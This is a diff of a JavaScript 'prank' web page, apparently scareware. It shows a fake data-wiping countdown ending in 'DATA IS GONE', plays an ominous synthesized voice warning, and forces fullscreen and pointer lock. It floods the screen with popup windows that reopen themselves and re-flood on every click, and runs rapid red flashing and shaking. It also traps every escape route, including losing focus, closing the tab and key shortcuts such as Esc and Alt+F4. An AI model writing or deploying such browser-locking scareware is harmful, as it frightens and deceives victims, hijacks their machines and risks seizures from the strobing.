@@ -87,7 +87,7 @@
         }
         .message-details strong {
             font-weight: normal; 
-            color: #FF00FF; /* Pink/Magenta for max distraction */
+            color: #CC0000; /* DARK RED - REQUESTED CHANGE */
         }
         .stop-code {
             font-size: 14px;
@@ -174,10 +174,8 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         let progress = 0;
         let prankActivated = false; 
         
-        // --- Glitch loop variable ---
-        let ambientGlitchInterval;
-
         // --- TTS & Audio Conversion Utilities (Needed for playback) ---
+        // Converts base64 PCM data to an ArrayBuffer
         function base64ToArrayBuffer(base64) {
             const binaryString = atob(base64);
             const len = binaryString.length;
@@ -188,6 +186,7 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             return bytes.buffer;
         }
 
+        // Converts raw PCM (L16) data into a playable WAV Blob
         function pcmToWav(pcm16, sampleRate) {
             const numChannels = 1;
             const bitsPerSample = 16;
@@ -309,11 +308,8 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                     if (progress > 100) progress = 100;
                     progressEl.textContent = `${progress}% complete`;
                 } else {
-                    // When 100% is reached, stop the interval and display the final message
                     progressEl.textContent = `100% complete... LOCKDOWN COMPLETE. DATA IS GONE.`;
                     clearInterval(progressInterval); 
-                    // CRITICAL CHANGE: Do NOT call simulateClosingFailure here. 
-                    // The ambientGlitchInterval keeps the glitch running.
                 }
             }, 50); // Much faster update
         }
@@ -340,23 +336,27 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             const apiKey = ""; 
             const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent?key=${apiKey}`;
 
-            const payload = {
-                contents: [{ parts: [{ text: ttsPrompt }] }],
-                generationConfig: {
-                    responseModalities: ["AUDIO"],
-                    speechConfig: {
-                        voiceConfig: { prebuiltVoiceConfig: { voiceName: "Charon" } } // Deep voice
-                    }
-                },
-                model: "gemini-2.5-flash-preview-tts"
-            };
-
             try {
                 const response = await fetch(apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: ttsPrompt }] }],
+                        generationConfig: {
+                            responseModalities: ["AUDIO"],
+                            speechConfig: {
+                                voiceConfig: { prebuiltVoiceConfig: { voiceName: "Charon" } } 
+                            }
+                        },
+                        model: "gemini-2.5-flash-preview-tts"
+                    })
                 });
+
+                if (!response.ok) {
+                    console.error("TTS API returned a non-success status:", response.status);
+                    startBackgroundAlarm();
+                    return;
+                }
 
                 const result = await response.json();
                 const part = result?.candidates?.[0]?.content?.parts?.[0];
@@ -366,20 +366,24 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                 if (audioData && mimeType && mimeType.startsWith("audio/L16")) {
                     const rateMatch = mimeType.match(/rate=(\d+)/);
                     const sampleRate = rateMatch ? parseInt(rateMatch[1], 10) : 24000;
+                    
+                    // Conversion sequence
                     const pcmBuffer = base64ToArrayBuffer(audioData);
                     const pcm16 = new Int16Array(pcmBuffer);
                     const wavBlob = pcmToWav(pcm16, sampleRate);
                     const audioUrl = URL.createObjectURL(wavBlob);
+                    
+                    // Playback
                     const audio = new Audio(audioUrl);
+                    audio.onended = startBackgroundAlarm; // Start alarm when warning finishes
                     await audio.play();
-                    audio.onended = startBackgroundAlarm;
                 } else {
-                    console.error("TTS data missing or invalid. Falling back to immediate alarm start.");
+                    console.error("TTS data missing, invalid format, or empty response. Falling back to immediate alarm start.");
                     startBackgroundAlarm();
                 }
 
             } catch (error) {
-                console.error("TTS API call failed:", error.message);
+                console.error("TTS API call or conversion failed:", error.message);
                 // Crucial Fallback: Always start the alarm if TTS fails
                 startBackgroundAlarm();
             }
@@ -394,13 +398,13 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             return `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes,status=yes`;
         }
             
-        // --- Window Flood Functions ---
+        // Get base URL without any existing hash
+        const currentUrl = window.location.href.split('#')[0]; 
+        const autoStartUrl = currentUrl + "#start";
         
-        const currentUrl = window.location.href; // Get the URL of this exact page
-        
-        // 1. ASYNCHRONOUS DELAYED FLOOD (10 windows)
+        // 1. ASYNCHRONOUS DELAYED FLOOD (5 windows)
         function startSecondaryFlood() {
-            const NUM_STAGGERED_WINDOWS = 10; 
+            const NUM_STAGGERED_WINDOWS = 5; 
             let count = 0;
             
             const floodInterval = setInterval(() => {
@@ -408,20 +412,28 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                     clearInterval(floodInterval);
                     return;
                 }
-                // Open a new, larger window loading the exact same prank page
-                window.open(currentUrl, '_blank', getRandomWindowFeatures(600, 400));
+                window.open(autoStartUrl, '_blank', getRandomWindowFeatures(600, 400));
                 count++;
             }, 50); 
         }
 
-        // 2. HYPER-SYNCHRONOUS IMMEDIATE BLAST (10 windows)
+        // 2. HYPER-SYNCHRONOUS IMMEDIATE BLAST (5 windows)
         function startSynchronousBlast() {
-            const NUM_WINDOWS = 10; 
+            const NUM_WINDOWS = 5; 
             for (let i = 0; i < NUM_WINDOWS; i++) {
-                // Open a new, massive window loading the exact same prank page
-                window.open(currentUrl, '_blank', getRandomWindowFeatures(800, 600));
+                window.open(autoStartUrl, '_blank', getRandomWindowFeatures(800, 600));
             }
         }
+
+        // --- Window Flood Repeat Function ---
+        function repeatWindowFlood() {
+            // Only the main window should repeat the flood, not the popups
+            if (window.location.hash !== '#start') {
+                startSynchronousBlast(); 
+                startSecondaryFlood();
+            }
+        }
+
 
         // --- Fullscreen and Pointer Lock (Wrapped) ---
         function forceFullscreen() {
@@ -440,14 +452,12 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
 
         // --- Red Flash & Shake Function (Maximum Glitch) ---
         function simulateClosingFailure(isEscapeAttempt = false) {
-            // Note: isEscapeAttempt controls the audio response (pitch change/noise burst)
             if (!prankActivated || isSimulatingFailure) return;
 
             isSimulatingFailure = true; 
             tauntOverlay.classList.add('active');
             bodyEl.classList.add('shake-active'); 
             
-            // Randomize taunt message position slightly on failure
             tauntText.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`; 
             
             if(isEscapeAttempt && Tone.Transport.state === 'started') {
@@ -455,11 +465,10 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                 Tone.Transport.bpm.value = ALARM_BPM_MAX; 
             }
 
-            // The flash duration remains ultra-short for maximum flicker effect
             setTimeout(() => {
                 tauntOverlay.classList.remove('active');
                 bodyEl.classList.remove('shake-active'); 
-                tauntText.style.transform = `none`; // Reset position
+                tauntText.style.transform = `none`; 
                 isSimulatingFailure = false;
                 
                 if(isEscapeAttempt && Tone.Transport.state === 'started') {
@@ -468,47 +477,65 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             }, 10); 
         }
 
-        // --- New: Constant Ambient Glitch Loop ---
+        // --- Constant Ambient Glitch Loop (Randomized) ---
         function startAmbientGlitchLoop() {
-            // Triggers a full flash and shake every 750 milliseconds
-            ambientGlitchInterval = setInterval(() => {
-                simulateClosingFailure(false);
-            }, 750);
+            const randomDelay = Math.random() * 1300 + 200; 
+            
+            simulateClosingFailure(false); 
+
+            if (prankActivated) {
+                setTimeout(startAmbientGlitchLoop, randomDelay);
+            }
         }
 
-        // --- Core Activation Logic (Single Click Trigger) ---
+
+        // --- Core Activation Logic (One-time Setup) ---
         function activatePrank() {
             if (prankActivated) return;
             prankActivated = true;
             
-            // CRITICAL SYNCHRONOUS ACTIONS
-            Tone.start().then(() => {
-                playScaryDrone(); 
-                speakAndPlayWarning(); 
-            });
-
+            // CRITICAL LOCKDOWN ACTIONS (Run on ALL instances)
             forceFullscreen();
             forcePointerLock(); 
-
-            // START THE CONSTANT, AMBIENT GLITCH LOOP
+            requestAnimationFrame(hideAndLock); 
             startAmbientGlitchLoop();
+            startProgressLoop();
 
-            // EXTREME SYNCHRONOUS BLAST (The main cascade starter)
-            startSynchronousBlast(); 
+            // CRITICAL AUDIO SETUP (Only done once per instance)
+            // Tone.start must be inside the user gesture handler
+            Tone.start().then(() => {
+                playScaryDrone(); 
+                if (window.location.hash !== '#start') {
+                    speakAndPlayWarning(); // Main window
+                } else {
+                    startBackgroundAlarm(); // Popup
+                }
+            });
+
+            // WINDOW FLOOD (First flood triggered here, only by parent)
+            if (window.location.hash !== '#start') {
+                // 1. Trigger the first flood immediately
+                repeatWindowFlood();
+                
+                // 2. Attach the permanent click listener for REPEATING the flood
+                document.body.addEventListener('click', repeatWindowFlood);
+            }
             
-            // ASYNCHRONOUS ACTIONS (Start the loops)
-            requestAnimationFrame(hideAndLock); // Start the hyper-aggressive lock loop
-            startSecondaryFlood();
-
+            // Remove the one-time click listener that triggered the initialization
             document.removeEventListener('click', activatePrank);
         }
         
-        document.addEventListener('click', activatePrank, { once: true });
+        // === INITIAL PRANK CHECK ===
+        if (window.location.hash === '#start') {
+            // Popup: Activate immediately
+            activatePrank();
+        } else {
+            // Main Window: Wait for the first user click (using the one-time flag)
+            document.addEventListener('click', activatePrank, { once: true });
+        }
 
 
-        
-        // === THE ESCAPE TRAP: AGGRESSIVE RE-ENTRY AND RED FLASH ===
-        // This still uses simulateClosingFailure(true) for the escape-specific audio/BPM change
+        // === THE ESCAPE TRAPS: ALL ACTIVE IN EVERY WINDOW ===
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement && prankActivated) {
                 simulateClosingFailure(true);
@@ -517,7 +544,6 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         });
 
         
-        // === THE ONBLUR TRAP: Alt+Tab or clicking outside ===
         window.onblur = function() {
             if (!prankActivated) return; 
             simulateClosingFailure(true);
@@ -526,7 +552,6 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             }, 1); 
         };
         
-        // === THE ONBEFOREUNLOAD TRAP: Closing the Tab/Window 'X' Button ===
         window.onbeforeunload = function(e) {
             if (!prankActivated) return;
             simulateClosingFailure(true);
@@ -537,7 +562,6 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         };
 
 
-        // === Anti-Shortcut (Blocks Esc, Alt+F4, F11, Ctrl+W/Cmd+W) ===
         document.onkeydown = function(e) {
             if (!prankActivated) return;
             
